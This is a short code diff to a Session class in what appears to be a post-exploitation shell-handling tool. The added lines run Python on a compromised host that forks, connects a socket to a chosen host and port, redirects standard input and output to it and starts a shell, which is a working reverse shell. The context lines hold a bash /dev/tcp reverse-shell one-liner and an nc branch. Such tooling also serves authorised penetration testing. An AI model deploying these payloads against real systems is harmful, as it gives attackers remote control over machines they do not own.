@@ -4397,6 +4397,21 @@ class Session:
 							logger.error(f"Cannot listen on {host}:{port}. Spawning shell aborted")
 							return False
 
+				logger.info(f"Attempting to spawn a reverse shell on {host}:{port}")
+				if self.agent:
+					self.exec(f"""
+						import os, socket
+						if os.fork() == 0:
+							os.setsid()
+							s = socket.socket()
+							s.connect(("{host}", {port}))
+							for fd in (0, 1, 2):
+								os.dup2(s.fileno(), fd)
+							os.execl("{self.shell}", "{self.shell}")
+							os._exit(1)
+					""", python=True)
+					return True
+
 				if self.bin['bash']:
 					cmd = f'printf "(bash >& /dev/tcp/{host}/{port} 0>&1) &"|bash'
 				elif self.bin['nc'] and self.bin['sh']:
